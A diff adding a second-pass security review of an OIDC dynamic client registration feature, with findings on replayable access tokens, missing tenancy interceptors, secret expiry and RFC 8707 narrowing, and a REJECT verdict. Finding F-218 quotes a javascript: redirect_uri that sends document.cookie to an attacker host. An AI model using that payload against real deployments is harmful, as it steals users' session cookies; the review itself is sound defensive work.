@@ -87,3 +87,78 @@ Review date: 2026-04-27
 2. **Bundle F-102 into F-101 fix** — moving dummy-hash construction to a wiring-site initialization call also gives ResolveIAT a real production caller as soon as T-040 ships.
 3. **Defer F-103 / F-104 / F-105 / F-106** — log + revisit at next /ck:check boundary; not blocking.
 4. **Downgrade T-037 status** — flip from DONE to PARTIAL in `context/impl/impl-register-handler.md` until T-040 wiring lands.
+
+
+---
+
+# /ck:check Findings — 2026-04-27 (Tier 3 close-out — second pass)
+
+Build site: context/plans/build-site.md
+Tier reviewed: 3 close-out (loop window 9e6f0435c..84c36d160 → 10 task commits + 1 wiring fix)
+Base ref: 9e6f0435c (previous /ck:check REJECT verdict — F-100/F-101/F-102/F-103 all RESOLVED)
+Reviewers: ck:verifier (opus) + ck:surveyor (opus) + ck:inspector (opus, code) + ck:inspector (opus, security audit). Codex skipped — wrappers absent in repo.
+Review date: 2026-04-27
+
+## Findings
+
+| ID | Severity | Vector | File | Description | Status |
+|----|----------|--------|------|-------------|--------|
+| F-200 | **P0** | auth/anti-replay | internal/api/oidc/dcr/wire.go:285-323 + internal/command/dynamic_client_registration.go:97-99 + cmd/start/start.go:716-742 | **IAT slot is NEVER consumed.** `ResolveIAT` doc says caller MUST consume; `RegisterClient` doc says caller MUST have already consumed; the dispatcher doesn't; the start.go closure doesn't. `grep -rn ConsumeInitialAccessToken internal/api/oidc/ internal/command/dynamic_client_registration.go` returns ZERO call sites. Any valid IAT can be replayed unboundedly to register N clients regardless of MaxUses. The R2 race-safety harness, the per-slot UniqueConstraint, and the Errors.DCR.IAT.Exhausted error path are all dead code in production. | NEW |
+| F-201 | **P0** | secret/persistence | internal/api/oidc/dcr/wire.go:186 + wire.go:329 + internal/api/oidc/dcr/response.go:177 + cmd/start/start.go:716-742 | **client_secret_expires_in dropped.** `RegisterResult` carries no `ClientSecretExpiresIn` field; dispatcher leaves `RegistrationOutput.ClientSecretExpiresIn` zero; `clientSecretExpiresAtFor` returns 0 ("no expiry" sentinel). `config.OIDC.DCR.ClientSecretExpiresIn` (op.go:74) is never threaded through. Every issued client_secret advertises "never expires" regardless of policy. | NEW |
+| F-217 | **P0** | auth/tenancy | cmd/start/start.go:744 | **DCR handler mounted WITHOUT instanceInterceptor + WITHOUT limitingAccessInterceptor.** Compare to login/idp/saml mounts which wrap both. `authz.GetInstance(ctx)` returns `emptyInstance` → `featureGateMiddleware` reads `emptyInstance.Features().DynamicClientRegistration` (always false) so endpoint is unreachable in default config; if any host-routing layer side-steps this, anonymous DCR registrations persist with `instance_id=""` (cross-tenant). No rate limit on what is by design an unauthenticated, write-amplifying endpoint. | NEW |
+| F-203 | **P0** | rfc8707/refresh | internal/api/oidc/token_refresh.go:29-37 + internal/api/oidc/rfc8707_token.go:60-63 | **v2 refresh-token path skips RFC 8707 §2.2 narrowing.** Only `refreshTokenV1` (line 59) calls `narrowAudienceByTokenResources`. The primary `RefreshToken` (line 29) calls `ExchangeOIDCSessionRefreshAndAccessToken` and never reads `ResourcesFromContext`. v2 refresh requests with `resource=...` either silently broaden or silently ignore. F-001 `/token` closure only complete for V1. | NEW |
+| F-218 | **P1** | redir/XSS | internal/domain/application_oidc.go:300-308,340-349 (consumed at internal/api/oidc/dcr/validate.go:267) | **`javascript:` / `data:` / `file:` redirect_uris accepted for `application_type=native`.** Compliance code only special-cases http/https; any other scheme falls into `containsCustom` and is allowed. Combined with `isLoopbackHTTP` short-circuit, custom-scheme URIs bypass `AllowedRedirectURIHostPatterns`. A registered client with `redirect_uris=["javascript:fetch('https://attacker/?'+document.cookie)"]` and `application_type=native` is persisted; any /authorize flow against that client_id delivers XSS through the user-agent. | NEW |
+| F-202 | P1 | info-leak/header | internal/api/oidc/dcr/wire.go:346-353 | `writeDispatchError` falls back to `WriteError(w, 500, ErrCodeInvalidClientMetadata, err.Error())`. DB / eventstore push errors leak zerror IDs (COMMA-..., DCR-RC005), wrapped error chains, possibly SQL state to unauthenticated callers. Wrong envelope code too (DB failure ≠ invalid_client_metadata). | NEW |
+| F-219 | P1 | sidechannel/auth-order | internal/api/oidc/dcr/wire.go:277-296 | **Decode runs BEFORE auth.** With `RequireInitialAccessToken=true`, an anonymous attacker probes 413/415/400 + JSON-parse fingerprint without ever being challenged for Bearer. The 401 only fires after decode succeeds. Endpoint becomes a free fingerprint surface. R3 implies "401 first when IAT required". | NEW |
+| F-204 | P1 | dos/config | internal/api/oidc/dcr/decode.go:99-102 | `MaxBodyBytes==0` from yaml is silently rewritten to 64 KiB, not "unlimited". An admin who explicitly sets MaxRequestBodyBytes=0 (intending no cap) gets the default fallback. No way to disable. `software_statement` JWTs may legitimately exceed 64 KiB. | NEW |
+| F-205 | P1 | test-integrity | internal/query/projection/dcr_rollback_test.go:46 | **The "compile-time" size-anchor does NOT detect drift.** `var _ = unsafe.Sizeof(initColumnMirror{}) - unsafe.Sizeof(handler.InitColumn{})` evaluates to a uintptr; subtraction compiles cleanly under any size delta. Mirror could silently misread `nullable` as `defaultValue` if upstream struct grows by a field. | NEW |
+| F-206 | P2 | audit-completeness | cmd/start/start.go:716-742 + internal/command/dynamic_client_registration.go:54 | `SoftwareStatementJTI` field exists in `RegisterClientInput` and the audit event but is never populated end-to-end. Phase 2 software_statement work will record empty JTI. Dead code today. | NEW |
+| F-207 | P2 | privacy/audit | internal/command/dynamic_client_registration.go:246-253 | **Salt-less SHA-256 of an IPv4 address is brute-forceable** (~2³² keys, minutes on a laptop). Doc says "privacy" but the field is recoverable. HMAC with audit key OR truncate to /24 before hash. | NEW |
+| F-208 | P2 | auth/integrity | internal/command/dynamic_client_registration.go:103-152 | `RegisterClient` performs no project-existence check. Anonymous DCR with `DefaultProjectID="non-existent"` pushes 4 events onto an aggregate with no `ProjectAddedEvent` ancestor; projection silently drops the row, eventstore retains orphans. | NEW |
+| F-209 | P2 | auth/header | internal/api/oidc/dcr/wire.go:358-366 | `writeAuthError` only sets `WWW-Authenticate` for ClampError with code `invalid_token`; non-ClampError 401 paths fall through to writeDispatchError → 500 + leaked err.Error(). | NEW |
+| F-210 | P2 | dos/storage | internal/repository/project/dynamic_client_registration.go:35,37 | Attacker-controlled `ClientNameUnclamped` (up to 64 KiB) and `UserAgent` (HTTP-header-sized, unbounded by stdlib) persisted to eventstore without length cap or sanitization. Log-injection via control chars also possible. | NEW |
+| F-211 | P2 | test-integrity | internal/api/oidc/integration_test/rfc8707_resource_test.go:165-176 | Opaque-token fall-through: `if len(parts) != 3 { return nil }` — assertion `Contains(nil, resource1)` fails the test on Zitadel default (opaque tokens), not skips. Test breaks the integration suite. | NEW |
+| F-212 | P2 | rfc8707/contract | internal/api/oidc/rfc8707_token.go:60-63 | Empty-intersection guard returns ORIGINAL audience. Per RFC 8707 §2.2 the right answer is `invalid_target` 400 — current behaviour issues a token whose audience differs from what client requested. Sidecar rejects upstream (allowed-list pre-check) but if AllowedAudiences is empty (sentinel: unrestricted), this fires. | NEW |
+| F-220 | P2 | dos/auth | internal/api/oidc/dcr/decode.go:103 | `http.MaxBytesReader(nil, r.Body, max)` — first arg should be `http.ResponseWriter` so `Connection: close` fires on overflow. Pipelined attacker keeps connection alive after 413, costs accept-loop time. No rate-limit (see F-217). | NEW |
+| F-221 | P2 | auth/parsing | internal/api/oidc/dcr/auth.go:65-74 | `"Bearer\tfoo"` (tab separator per RFC 9110 §11.4) treated as `AuthModeAnonymous` instead of IAT. Misconfigured proxy that uses tab handles a valid IAT to anonymous code path. `Bearer foo bar` keeps internal whitespace in tok. | NEW |
+| F-222 | P2 | privacy/header | internal/api/oidc/dcr/wire.go:317 + internal/api/http/header.go:107 | UA + RemoteIPStringFromRequest plumbed un-sanitised. UA un-truncated (control chars + 8KB strings persisted). `RemoteIPStringFromRequest` honours XFF — without trusted-proxy whitelist (and DCR has no instance interceptor per F-217), source IP is spoofable. | NEW |
+| F-213 | P3 | quality | internal/api/oidc/dcr/wire.go:368-375 | Dead-code anchor `var _ = func() bool { ... }()` runs at init time uselessly. | NEW |
+| F-214 | P3 | testing/coverage | internal/api/oidc/dcr/decode.go:139-143 | "drop client_name#&lt;lang&gt;" comment lacks regression test. | NEW |
+| F-215 | P3 | drift-risk | internal/api/oidc/dcr/wire.go:152-159 | Duplicated string consts (`RegMethodAnonymous`/`IAT`) mirror `command.RegistrationMethod*` — drift risk for future enum additions. | NEW |
+| F-216 | P3 | observability | internal/api/oidc/dcr/response.go:127 + wire.go:337 | `_ = WriteRegistrationResponse(...)` discards encode error. Partial write means client never sees RAT, events committed, client unusable. | NEW |
+| F-223 | P3 | crypto/startup | internal/api/oidc/dcr/wire.go:69-78 | `BuildAntiEnumDummyHash` probe panics only if Verify returns ErrNoVerifier; if a future hasher returns nil error for any input, probe silently accepts. Use TWO different wrong plaintexts. | NEW |
+| F-224 | P3 | auth/feature | internal/api/oidc/dcr/handler.go:91 | `featureGateMiddleware` only checks runtime feature flag, not yaml-gate. If yaml gate were ever bypassed, runtime flag becomes single point of control. Defence-in-depth: also consult yaml flag. | NEW |
+| F-225 | P3 | csrf | cmd/start/start.go:744 | DCR endpoint has no CORS wrapper — JSON CSRF is naturally blocked by preflight requirement. Anonymous mode means `text/plain` simple-CORS still consumes quota / spans. Document the assumption. | NEW |
+| F-226 | P3 | clamp/contract | internal/api/oidc/dcr/validate.go:354-368 | `intersectStringSlice` empty-intersection semantics is comment-only (`// empty allow-list = deny all`). Fragile — make it a typed `(result []string, ok bool)` so future callers can't misread it (would have caught F-212 shape). | NEW |
+
+## Verifier verdict (goal-backward AC check)
+**APPROVE** — 51 / 56 ACs MET, 4 PARTIAL (sanctioned deferrals), 1 UNVERIFIABLE (R3 AC4 wording mismatch — semantically equivalent). T-046 flagged as "falsely complete" — strict reading of R5 AC7 ("integration test exercises EACH handler") is PARTIAL when only client_credentials is exercised end-to-end.
+
+## Coverage (Tier 0–3)
+- 24 in-scope requirements: 17 COMPLETE / 7 PARTIAL (all sanctioned deferrals to Tier 4-6 doc/integration tasks)
+- All 49 Tier 0–3 tasks marked DONE in loop log
+- No OVER-BUILT findings
+
+## Verdict
+
+**REJECT** — 4 P0 + 5 P1 findings. Three of the P0s are foundational:
+1. **F-200** breaks the central anti-replay invariant of the entire IAT system. Every piece of race-safety work in T-017/T-018 + the per-slot UniqueConstraint mechanism is dead code in production because no one calls `ConsumeInitialAccessToken`.
+2. **F-217** mounts the DCR handler without `instanceInterceptor` and without `limitingAccessInterceptor`. Either the endpoint is unreachable (default config — `authz.GetInstance` returns emptyInstance, runtime flag always false) OR if any deployment side-steps the gate, anonymous DCR persists with `instance_id=""` (cross-tenant write). No rate limit on a write-amplifying endpoint.
+3. **F-201** + **F-203** are functional regressions on configured fields (client_secret_expires_in always 0; v2 refresh skips RFC 8707 §2.2 narrowing). Both are "wired up but the wire goes nowhere".
+4. **F-218** turns DCR into an XSS-distribution channel for any deployment allowing `application_type=native` (the default).
+
+The Tier 3 work shipped with passing tests and clean kits because the test scaffolding never exercised the production-wired `cmd/start/start.go` path end-to-end. The verifier confirms the building blocks individually MET their kit ACs; the inspector + security audit found the assembly is broken.
+
+## Kit gaps revealed (candidates for /ck:revise --trace)
+
+- **F-200** reveals a kit gap: cavekit-register-handler.md R6 + cavekit-iat.md R2 do not pin "the dispatcher MUST consume an IAT slot before commit." This is the same shape as F-101 — kit AC is described in plain English ("consume one use") but the dispatcher contract is unspecified.
+- **F-217** reveals a kit gap: no requirement specifies that DCR mounts MUST inherit `instanceInterceptor` + `limitingAccessInterceptor`. cavekit-config.md R3 just says "dual-gate". Add an R: "Mount middleware: DCR handlers MUST be mounted via the same interceptor stack as /oidc/v1/userinfo (instance + rate-limit + access-log + activity)."
+- **F-218** reveals a kit gap: cavekit-register-handler.md R4 redirect_uri ACs do not pin a scheme allow-list. After F-100 (host parser bypass) this is the SECOND redirect_uri-related kit gap in the same loop window.
+- **F-219** (auth-then-decode order) reveals a kit ambiguity: R3 implies 401 first but does not pin sequencing. The dispatcher invented an order without it being specified.
+
+## Recommended next actions
+
+1. **Block on F-200, F-201, F-217, F-203, F-218** — these MUST land before any Tier 4 work. Route through `/ck:revise --trace --from-finding F-XXX` for each (kit amendments precede code fixes per the post-DE-001 protocol).
+2. **F-202, F-204, F-205, F-219** — fix in same batch; these are all dispatcher / decode hardening.
+3. **Defer F-206..F-216, F-220..F-226** — log + revisit at Tier 4 boundary; not blocking but should be addressed before Phase 2.
+4. **Downgrade T-040 + T-043 status** — flip from DONE to PARTIAL until F-200 + F-201 fixes land. The dispatcher composition is correct (verifier approved) but the production wiring is incomplete.
